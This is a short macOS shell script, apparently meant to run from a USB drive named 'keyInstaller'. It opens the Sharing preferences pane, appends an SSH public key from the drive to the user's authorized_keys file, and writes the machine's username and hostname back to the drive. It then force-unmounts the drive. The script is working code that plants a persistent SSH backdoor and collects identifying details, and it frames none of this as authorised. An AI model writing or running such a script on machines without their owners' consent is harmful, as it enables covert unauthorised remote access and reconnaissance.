#! /bin/sh
open /System/Library/PreferencePanes/SharingPref.prefPane/ && cat /Volumes/keyInstaller/id_rsa.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && whoami >> /Volumes/keyInstaller/whoamis.txt && hostname >> /Volumes/keyInstaller/hostnames.txt && toeject=$(df -h | grep /Volumes/keyInstaller) && toeject=${toeject:0:12}
diskutil unmount $toeject
diskutil unmountDisk force $toeject
